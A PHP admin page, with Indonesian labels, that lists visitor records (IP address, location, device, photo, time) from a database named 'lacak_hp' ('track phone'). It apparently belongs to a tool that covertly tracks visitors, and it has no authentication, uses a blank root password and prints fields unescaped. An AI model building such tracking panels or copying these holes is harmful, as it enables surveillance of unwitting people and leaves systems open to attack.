<?php

// ===============================
// KONEKSI DATABASE
// ===============================
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// ===============================
// AMBIL DATA
// ===============================
$result = $conn->query("SELECT * FROM pengunjung ORDER BY id DESC");

?>

<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>

    <style>

        body {
            margin: 0;
            font-family: Arial;
            background: #0a0a0a;
            color: white;
        }

        header {
            background: black;
            padding: 15px;
            text-align: center;
            font-size: 20px;
            border-bottom: 1px solid #333;
        }

        .container {
            padding: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #111;
        }

        th, td {
            padding: 10px;
            border: 1px solid #333;
            text-align: center;
        }

        th {
            background: #222;
        }

        img {
            width: 80px;
            border-radius: 5px;
        }

        .btn {
            padding: 8px 15px;
            background: #00ffcc;
            border: none;
            cursor: pointer;
        }

        .btn:hover {
            background: #00ccaa;
        }

    </style>
</head>

<body>

<header>
    ADMIN PANEL - DATA PENGUNJUNG
</header>

<div class="container">

    <table>

        <tr>
            <th>ID</th>
            <th>IP</th>
            <th>Lokasi</th>
            <th>Perangkat</th>
            <th>Foto</th>
            <th>Waktu</th>
        </tr>

        <?php while($row = $result->fetch_assoc()) { ?>

        <tr>

            <td><?php echo $row['id']; ?></td>

            <td><?php echo $row['ip_address']; ?></td>

            <td><?php echo $row['lokasi']; ?></td>

            <td style="font-size:12px">
                <?php echo $row['perangkat']; ?>
            </td>

            <td>
                <img src="foto/<?php echo $row['foto']; ?>">
            </td>

            <td><?php echo $row['waktu']; ?></td>

        </tr>

        <?php } ?>

    </table>

</div>

</body>
</html>
